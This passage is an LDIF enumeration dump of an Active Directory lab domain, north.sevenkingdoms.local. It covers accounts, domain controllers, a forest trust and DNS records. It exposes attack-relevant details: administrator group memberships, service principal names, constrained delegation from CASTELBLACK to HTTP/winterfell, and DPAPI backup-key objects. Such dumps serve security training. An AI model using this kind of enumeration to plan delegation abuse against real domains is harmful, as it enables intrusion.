objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# vagrant, Users, north.sevenkingdoms.local  
dn: CN=vagrant,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
cn: vagrant  
description: Vagrant User  
distinguishedName: CN=vagrant,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250501191334.0Z  
displayName: Vagrant  
uSNCreated: 8198  
memberOf: CN=Users,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
memberOf: CN=Administrators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
uSNChanged: 74923  
name: vagrant  
objectGUID:: 3+XSd9l8BkuyHHVxrk7opA==  
userAccountControl: 66048  
badPwdCount: 4  
codePage: 1252  
countryCode: 1  
badPasswordTime: 133906033336339262  
lastLogoff: 0  
lastLogon: 133890380791020650  
logonHours:: ////////////////////////////  
pwdLastSet: 133890341964299518  
primaryGroupID: 513  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhG6AMAAA==  
adminCount: 1  
accountExpires: 0  
logonCount: 657  
sAMAccountName: vagrant  
sAMAccountType: 805306368  
lockoutTime: 133906004143526509  
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413164658.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010714042016.0Z  
lastLogonTimestamp: 133890355971246178

\# cloudbase-init, Users, north.sevenkingdoms.local  
dn: CN=cloudbase-init,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
cn: cloudbase-init  
distinguishedName: CN=cloudbase-init,CN=Users,DC=north,DC=sevenkingdoms,DC=loc  
 al  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250501191334.0Z  
displayName: cloudbase-init  
uSNCreated: 8199  
memberOf: CN=Administrators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
uSNChanged: 74925  
name: cloudbase-init  
objectGUID:: SmSNhSwU0kaObt/7jZ5MLA==  
userAccountControl: 66048  
badPwdCount: 4  
codePage: 0  
countryCode: 0  
badPasswordTime: 133906033336651733  
lastLogoff: 0  
lastLogon: 133890348344025580  
pwdLastSet: 133890348344025580  
primaryGroupID: 513  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhG6QMAAA==  
adminCount: 1  
accountExpires: 9223372036854775807  
logonCount: 6  
sAMAccountName: cloudbase-init  
sAMAccountType: 805306368  
lockoutTime: 133906004144463986  
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413164658.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010714042016.0Z

\# Computers, north.sevenkingdoms.local  
dn: CN=Computers,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: Computers  
description: Default container for upgraded computer accounts  
distinguishedName: CN=Computers,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
uSNCreated: 7763  
uSNChanged: 7763  
showInAdvancedViewOnly: FALSE  
name: Computers  
objectGUID:: 52QnbNQ+7EyXsIeJ0EX5yA==  
systemFlags: \-1946157056  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# CASTELBLACK, Computers, north.sevenkingdoms.local  
dn: CN=CASTELBLACK,CN=Computers,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
objectClass: computer  
cn: CASTELBLACK  
distinguishedName: CN=CASTELBLACK,CN=Computers,DC=north,DC=sevenkingdoms,DC=lo  
 cal  
instanceType: 4  
whenCreated: 20250413163816.0Z  
whenChanged: 20250822082431.0Z  
uSNCreated: 13011  
uSNChanged: 433239  
name: CASTELBLACK  
objectGUID:: 5a6zsg8eq0SGYOpxGTFM8Q==  
userAccountControl: 4096  
badPwdCount: 0  
codePage: 0  
countryCode: 0  
badPasswordTime: 133905732561182509  
lastLogoff: 0  
lastLogon: 134006912720673984  
localPolicyFlags: 0  
pwdLastSet: 133996213378070787  
primaryGroupID: 515  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhGUQQAAA==  
accountExpires: 9223372036854775807  
logonCount: 462  
sAMAccountName: CASTELBLACK$  
sAMAccountType: 805306369  
operatingSystem: Windows Server 2019 Datacenter Evaluation  
operatingSystemVersion: 10.0 (17763)  
dNSHostName: castelblack.north.sevenkingdoms.local  
servicePrincipalName: HTTP/winterfell.north.sevenkingdoms.local  
servicePrincipalName: TERMSRV/CASTELBLACK  
servicePrincipalName: TERMSRV/castelblack.north.sevenkingdoms.local  
servicePrincipalName: RestrictedKrbHost/CASTELBLACK  
servicePrincipalName: HOST/CASTELBLACK  
servicePrincipalName: RestrictedKrbHost/castelblack.north.sevenkingdoms.local  
servicePrincipalName: HOST/castelblack.north.sevenkingdoms.local  
objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=loc  
 al  
isCriticalSystemObject: FALSE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
lastLogonTimestamp: 134003246713797674  
msDS-AllowedToDelegateTo: HTTP/winterfell  
msDS-AllowedToDelegateTo: HTTP/winterfell.north.sevenkingdoms.local  
msDS-SupportedEncryptionTypes: 28

\# Domain Controllers, north.sevenkingdoms.local  
dn: OU=Domain Controllers,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: organizationalUnit  
ou: Domain Controllers  
description: Default container for domain controllers  
distinguishedName: OU=Domain Controllers,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7906  
uSNChanged: 7906  
showInAdvancedViewOnly: FALSE  
name: Domain Controllers  
objectGUID:: BSm6jr9RnEedIT/SfyuAEg==  
systemFlags: \-1946157056  
objectCategory: CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=sevenking  
 doms,DC=local  
isCriticalSystemObject: TRUE  
gPLink: \[LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=Syste  
 m,DC=north,DC=sevenkingdoms,DC=local;0\]  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# WINTERFELL, Domain Controllers, north.sevenkingdoms.local  
dn: CN=WINTERFELL,OU=Domain Controllers,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: person  
objectClass: organizationalPerson  
objectClass: user  
objectClass: computer  
cn: WINTERFELL  
distinguishedName: CN=WINTERFELL,OU=Domain Controllers,DC=north,DC=sevenkingdo  
 ms,DC=local  
instanceType: 4  
whenCreated: 20250413163148.0Z  
whenChanged: 20250818220529.0Z  
uSNCreated: 12293  
uSNChanged: 422407  
name: WINTERFELL  
objectGUID:: z/lX4iU7PkeORD23brnaRg==  
userAccountControl: 532480  
badPwdCount: 0  
codePage: 0  
countryCode: 0  
badPasswordTime: 133904976923370410  
lastLogoff: 0  
lastLogon: 134006907328330268  
localPolicyFlags: 0  
pwdLastSet: 133995684543398910  
primaryGroupID: 516  
objectSid:: AQUAAAAAAAUVAAAAHQMSi8zSs8llODhG6gMAAA==  
accountExpires: 9223372036854775807  
logonCount: 865  
sAMAccountName: WINTERFELL$  
sAMAccountType: 805306369  
operatingSystem: Windows Server 2019 Datacenter Evaluation  
operatingSystemVersion: 10.0 (17763)  
serverReferenceBL: CN=WINTERFELL,CN=Servers,CN=Default-First-Site-Name,CN=Site  
 s,CN=Configuration,DC=sevenkingdoms,DC=local  
dNSHostName: winterfell.north.sevenkingdoms.local  
rIDSetReferences: CN=RID Set,CN=WINTERFELL,OU=Domain Controllers,DC=north,DC=s  
 evenkingdoms,DC=local  
servicePrincipalName: ldap/winterfell.north.sevenkingdoms.local/DomainDnsZones  
 .north.sevenkingdoms.local  
servicePrincipalName: ldap/winterfell.north.sevenkingdoms.local/ForestDnsZones  
 .sevenkingdoms.local  
servicePrincipalName: TERMSRV/WINTERFELL  
servicePrincipalName: TERMSRV/winterfell.north.sevenkingdoms.local  
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/winterfell.nor  
 th.sevenkingdoms.local  
servicePrincipalName: DNS/winterfell.north.sevenkingdoms.local  
servicePrincipalName: GC/winterfell.north.sevenkingdoms.local/sevenkingdoms.lo  
 cal  
servicePrincipalName: RestrictedKrbHost/winterfell.north.sevenkingdoms.local  
servicePrincipalName: RestrictedKrbHost/WINTERFELL  
servicePrincipalName: RPC/3ae44b93-a578-483b-9a12-f99cab7a2951.\_msdcs.sevenkin  
 gdoms.local  
servicePrincipalName: HOST/WINTERFELL/NORTH  
servicePrincipalName: HOST/winterfell.north.sevenkingdoms.local/NORTH  
servicePrincipalName: HOST/WINTERFELL  
servicePrincipalName: HOST/winterfell.north.sevenkingdoms.local  
servicePrincipalName: HOST/winterfell.north.sevenkingdoms.local/north.sevenkin  
 gdoms.local  
servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/3ae44b93-a578-483b-  
 9a12-f99cab7a2951/north.sevenkingdoms.local  
servicePrincipalName: ldap/WINTERFELL/NORTH  
servicePrincipalName: ldap/3ae44b93-a578-483b-9a12-f99cab7a2951.\_msdcs.sevenki  
 ngdoms.local  
servicePrincipalName: ldap/winterfell.north.sevenkingdoms.local/NORTH  
servicePrincipalName: ldap/WINTERFELL  
servicePrincipalName: ldap/winterfell.north.sevenkingdoms.local  
servicePrincipalName: ldap/winterfell.north.sevenkingdoms.local/north.sevenkin  
 gdoms.local  
objectCategory: CN=Computer,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=loc  
 al  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z  
lastLogonTimestamp: 134000283295672665  
msDS-SupportedEncryptionTypes: 28  
msDS-GenerationId:: OUvYIGODCko=  
msDFSR-ComputerReferenceBL: CN=WINTERFELL,CN=Topology,CN=Domain System Volume,  
 CN=DFSR-GlobalSettings,CN=System,DC=north,DC=sevenkingdoms,DC=local

\# RID Set, WINTERFELL, Domain Controllers, north.sevenkingdoms.local  
dn: CN=RID Set,CN=WINTERFELL,OU=Domain Controllers,DC=north,DC=sevenkingdoms,D  
 C=local  
objectClass: top  
objectClass: rIDSet  
cn: RID Set  
distinguishedName: CN=RID Set,CN=WINTERFELL,OU=Domain Controllers,DC=north,DC=  
 sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163158.0Z  
whenChanged: 20250413163158.0Z  
uSNCreated: 12422  
uSNChanged: 12425  
showInAdvancedViewOnly: TRUE  
name: RID Set  
objectGUID:: lN+GpiKxp0yAGHpAU82XOg==  
rIDAllocationPool: 6876242641998  
rIDPreviousAllocationPool: 6876242641998  
rIDUsedPool: 0  
rIDNextRID: 1122  
objectCategory: CN=RID-Set,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=loca  
 l  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z

\# DFSR-LocalSettings, WINTERFELL, Domain Controllers, north.sevenkingdoms.local  
dn: CN=DFSR-LocalSettings,CN=WINTERFELL,OU=Domain Controllers,DC=north,DC=seve  
 nkingdoms,DC=local  
objectClass: top  
objectClass: msDFSR-LocalSettings  
cn: DFSR-LocalSettings  
distinguishedName: CN=DFSR-LocalSettings,CN=WINTERFELL,OU=Domain Controllers,D  
 C=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163720.0Z  
whenChanged: 20250413164221.0Z  
uSNCreated: 12972  
uSNChanged: 13067  
showInAdvancedViewOnly: TRUE  
name: DFSR-LocalSettings  
objectGUID:: mlqeuw/AykKO/QlWpN/wTw==  
objectCategory: CN=ms-DFSR-LocalSettings,CN=Schema,CN=Configuration,DC=sevenki  
 ngdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163720.0Z  
dSCorePropagationData: 16010101000417.0Z  
msDFSR-Version: 1.0.0.0  
msDFSR-Flags: 48

\# Domain System Volume, DFSR-LocalSettings, WINTERFELL, Domain Controllers, nor  
 th.sevenkingdoms.local  
dn: CN=Domain System Volume,CN=DFSR-LocalSettings,CN=WINTERFELL,OU=Domain Cont  
 rollers,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: msDFSR-Subscriber  
cn: Domain System Volume  
distinguishedName: CN=Domain System Volume,CN=DFSR-LocalSettings,CN=WINTERFELL  
 ,OU=Domain Controllers,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163720.0Z  
whenChanged: 20250413163720.0Z  
uSNCreated: 12975  
uSNChanged: 12975  
showInAdvancedViewOnly: TRUE  
name: Domain System Volume  
objectGUID:: QHjFlC6MsUqNIBxwpWC4Yw==  
objectCategory: CN=ms-DFSR-Subscriber,CN=Schema,CN=Configuration,DC=sevenkingd  
 oms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
msDFSR-ReplicationGroupGuid:: H/hlFMYSuk66BXTC0hv4cQ==  
msDFSR-MemberReference: CN=WINTERFELL,CN=Topology,CN=Domain System Volume,CN=D  
 FSR-GlobalSettings,CN=System,DC=north,DC=sevenkingdoms,DC=local

\# SYSVOL Subscription, Domain System Volume, DFSR-LocalSettings, WINTERFELL, Do  
 main Controllers, north.sevenkingdoms.local  
dn: CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-LocalSettings,CN=WI  
 NTERFELL,OU=Domain Controllers,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: msDFSR-Subscription  
cn: SYSVOL Subscription  
distinguishedName: CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-Loca  
 lSettings,CN=WINTERFELL,OU=Domain Controllers,DC=north,DC=sevenkingdoms,DC=lo  
 cal  
instanceType: 4  
whenCreated: 20250413163720.0Z  
whenChanged: 20250413164221.0Z  
uSNCreated: 12976  
uSNChanged: 13068  
showInAdvancedViewOnly: TRUE  
name: SYSVOL Subscription  
objectGUID:: 2LKTT95if0Ce/4rnmkrIJQ==  
objectCategory: CN=ms-DFSR-Subscription,CN=Schema,CN=Configuration,DC=sevenkin  
 gdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
msDFSR-RootPath: C:\\Windows\\SYSVOL\\domain  
msDFSR-StagingPath: C:\\Windows\\SYSVOL\\staging areas\\north.sevenkingdoms.local  
msDFSR-Enabled: TRUE  
msDFSR-Options: 0  
msDFSR-ContentSetGuid:: n+11Jq7K1Ei9fOo+VYY8uA==  
msDFSR-ReplicationGroupGuid:: H/hlFMYSuk66BXTC0hv4cQ==  
msDFSR-ReadOnly: FALSE

\# System, north.sevenkingdoms.local  
dn: CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: System  
description: Builtin system settings  
distinguishedName: CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
uSNCreated: 7764  
uSNChanged: 7764  
showInAdvancedViewOnly: TRUE  
name: System  
objectGUID:: N+6HfpU2zkmaF/dJ8lTlsQ==  
systemFlags: \-1946157056  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Server, System, north.sevenkingdoms.local  
dn: CN=Server,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: securityObject  
objectClass: samServer  
cn: Server  
distinguishedName: CN=Server,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163657.0Z  
uSNCreated: 8238  
uSNChanged: 12962  
showInAdvancedViewOnly: TRUE  
name: Server  
objectGUID:: DSDAtXKeD0eZKe+VaKWSQw==  
revision: 65544  
systemFlags: \-1946157056  
objectCategory: CN=Sam-Server,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=l  
 ocal  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z  
samDomainUpdates:: /v8H

\# sevenkingdoms.local, System, north.sevenkingdoms.local  
dn: CN=sevenkingdoms.local,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: leaf  
objectClass: trustedDomain  
cn: sevenkingdoms.local  
distinguishedName: CN=sevenkingdoms.local,CN=System,DC=north,DC=sevenkingdoms,  
 DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250813142054.0Z  
uSNCreated: 8243  
uSNChanged: 405583  
showInAdvancedViewOnly: TRUE  
name: sevenkingdoms.local  
objectGUID:: vpCcMpKVCEmp633RvZsRDw==  
securityIdentifier:: AQQAAAAAAAUVAAAAOTwnl1iZLMFEjAK2  
trustDirection: 3  
trustPartner: sevenkingdoms.local  
trustPosixOffset: \-2147483648  
trustType: 2  
trustAttributes: 32  
flatName: SEVENKINGDOMS  
objectCategory: CN=Trusted-Domain,CN=Schema,CN=Configuration,DC=sevenkingdoms,  
 DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# RID Manager$, System, north.sevenkingdoms.local  
dn: CN=RID Manager$,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: rIDManager  
cn: RID Manager$  
distinguishedName: CN=RID Manager$,CN=System,DC=north,DC=sevenkingdoms,DC=loca  
 l  
instanceType: 4  
whenCreated: 20250413163158.0Z  
whenChanged: 20250413163158.0Z  
uSNCreated: 12419  
uSNChanged: 12424  
showInAdvancedViewOnly: TRUE  
name: RID Manager$  
objectGUID:: 63C8JvQ6jEWJnyqRkhN/8g==  
fSMORoleOwner: CN=NTDS Settings,CN=WINTERFELL,CN=Servers,CN=Default-First-Site  
 \-Name,CN=Sites,CN=Configuration,DC=sevenkingdoms,DC=local  
rIDAvailablePool: 4611686014132422210  
systemFlags: \-1946157056  
objectCategory: CN=RID-Manager,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=  
 local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z

\# BCKUPKEY\_e1951ebb-1164-416f-b7cd-65d4d7fa78d6 Secret, System, north.sevenking  
 doms.local  
dn: CN=BCKUPKEY\_e1951ebb-1164-416f-b7cd-65d4d7fa78d6 Secret,CN=System,DC=north  
 ,DC=sevenkingdoms,DC=local

\# BCKUPKEY\_P Secret, System, north.sevenkingdoms.local  
dn: CN=BCKUPKEY\_P Secret,CN=System,DC=north,DC=sevenkingdoms,DC=local

\# MicrosoftDNS, System, north.sevenkingdoms.local  
dn: CN=MicrosoftDNS,CN=System,DC=north,DC=sevenkingdoms,DC=local

\# RootDNSServers, MicrosoftDNS, System, north.sevenkingdoms.local  
dn: DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=north,DC=sevenkingdoms,DC=l  
 ocal  
objectClass: top  
objectClass: dnsZone  
cn: Zone  
distinguishedName: DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=north,DC=sev  
 enkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163232.0Z  
whenChanged: 20250413163232.0Z  
uSNCreated: 12453  
uSNChanged: 12455  
showInAdvancedViewOnly: TRUE  
name: RootDNSServers  
objectGUID:: 0asi0OKL60qDx2JAQ0QyZQ==  
objectCategory: CN=Dns-Zone,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=loc  
 al  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163232.0Z  
dSCorePropagationData: 20250413163232.0Z  
dSCorePropagationData: 16010101000417.0Z  
dc: RootDNSServers

\# @, RootDNSServers, MicrosoftDNS, System, north.sevenkingdoms.local  
dn: DC=@,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=north,DC=sevenkingdoms  
 ,DC=local  
objectClass: top  
objectClass: dnsNode  
distinguishedName: DC=@,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=north,D  
 C=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163232.0Z  
whenChanged: 20250413163232.0Z  
uSNCreated: 12456  
uSNChanged: 12456  
showInAdvancedViewOnly: TRUE  
name: @  
objectGUID:: y0mgh6LNmkWjpIU0AofrJA==  
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBbQxyb290LXNlcnZlcnMDbmV0AA==  
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBbAxyb290LXNlcnZlcnMDbmV0AA==  
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBawxyb290LXNlcnZlcnMDbmV0AA==  
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBagxyb290LXNlcnZlcnMDbmV0AA==  
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBaQxyb290LXNlcnZlcnMDbmV0AA==  
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBaAxyb290LXNlcnZlcnMDbmV0AA==  
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBZwxyb290LXNlcnZlcnMDbmV0AA==  
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBZgxyb290LXNlcnZlcnMDbmV0AA==  
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBZQxyb290LXNlcnZlcnMDbmV0AA==  
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBZAxyb290LXNlcnZlcnMDbmV0AA==  
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBYwxyb290LXNlcnZlcnMDbmV0AA==  
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBYgxyb290LXNlcnZlcnMDbmV0AA==  
dnsRecord:: FgACAAUIAAAAAAAAAAAAAAAAAAAAAAAAFAMBYQxyb290LXNlcnZlcnMDbmV0AA==  
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=loc  
 al  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
dc: @

\# a.root-servers.net, RootDNSServers, MicrosoftDNS, System, north.sevenkingdoms  
 .local  
dn: DC=a.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=north  
 ,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: dnsNode  
distinguishedName: DC=a.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163232.0Z  
whenChanged: 20250413163232.0Z  
uSNCreated: 12457  
uSNChanged: 12458  
showInAdvancedViewOnly: TRUE  
name: a.root-servers.net  
objectGUID:: o/mMduhPsUa7Csnb39lx0Q==  
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFA7o+AAAAAAAAAAIAMA==  
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=loc  
 al  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
dNSTombstoned: FALSE  
dc: a.root-servers.net

\# b.root-servers.net, RootDNSServers, MicrosoftDNS, System, north.sevenkingdoms  
 .local  
dn: DC=b.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=north  
 ,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: dnsNode  
distinguishedName: DC=b.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163232.0Z  
whenChanged: 20250413163232.0Z  
uSNCreated: 12459  
uSNChanged: 12460  
showInAdvancedViewOnly: TRUE  
name: b.root-servers.net  
objectGUID:: p9RDVOoOvUuxCXIDzSrRFw==  
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAKAEBuAAQAAAAAAAAAAAACw==  
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=loc  
 al  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
dNSTombstoned: FALSE  
dc: b.root-servers.net

\# c.root-servers.net, RootDNSServers, MicrosoftDNS, System, north.sevenkingdoms  
 .local  
dn: DC=c.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=north  
 ,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: dnsNode  
distinguishedName: DC=c.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163232.0Z  
whenChanged: 20250413163232.0Z  
uSNCreated: 12461  
uSNChanged: 12462  
showInAdvancedViewOnly: TRUE  
name: c.root-servers.net  
objectGUID:: s+pz/E0jjEqzcagqpFH2kA==  
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAAACAAAAAAAAAAAADA==  
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=loc  
 al  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
dNSTombstoned: FALSE  
dc: c.root-servers.net

\# d.root-servers.net, RootDNSServers, MicrosoftDNS, System, north.sevenkingdoms  
 .local  
dn: DC=d.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=north  
 ,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: dnsNode  
distinguishedName: DC=d.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163232.0Z  
whenChanged: 20250413163232.0Z  
uSNCreated: 12463  
uSNChanged: 12464  
showInAdvancedViewOnly: TRUE  
name: d.root-servers.net  
objectGUID:: n1W7B1lGUEWJ6MiGOPtDfg==  
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAAAtAAAAAAAAAAAADQ==  
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=loc  
 al  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 16010101000417.0Z  
dNSTombstoned: FALSE  
dc: d.root-servers.net

\# e.root-servers.net, RootDNSServers, MicrosoftDNS, System, north.sevenkingdoms  
 .local  
dn: DC=e.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=north  
 ,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: dnsNode  
distinguishedName: DC=e.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=  
 System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163232.0Z  
whenChanged: 20250413163232.0Z  
uSNCreated: 12465  
uSNChanged: 12466  
showInAdvancedViewOnly: TRUE  
name: e.root-servers.net  
objectGUID:: jjJUF5Bct0ufD0UvsKl5CA==  
dnsRecord:: EAAcAAUIAAAAAAAAAAAAAAAAAAAAAAAAIAEFAACoAAAAAAAAAAAADg==  
objectCategory: CN=Dns-Node,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=loc  
 al  
dSCorePropagationData: 20250413165358.0Z  
